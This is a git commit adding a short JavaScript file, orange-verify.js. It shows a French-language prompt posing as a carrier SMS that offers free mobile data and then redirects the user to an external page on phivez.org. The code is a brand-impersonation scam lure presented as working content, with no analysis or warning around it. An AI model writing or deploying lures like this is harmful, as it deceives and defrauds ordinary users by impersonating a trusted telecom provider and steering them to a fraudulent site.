4a8612ffb9bd1e4903c284cdef731cbb1e6e652c
newblog13 <sweet16guyz@gmail.com>
2026-05-18 09:42:11 +0100

    Create orange-verify.js

---
+++ orange-verify.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER'
+password=prompt('SMS: Cher client, profitez de 5 Go à 50 Go de données Internet gratuites ! Cliquez sur OK pour vérifier. ','ACTIVER');
+if (password != 'ACTIVER') {
+location.href='https://phivez.org/orange-offre.html';
+}
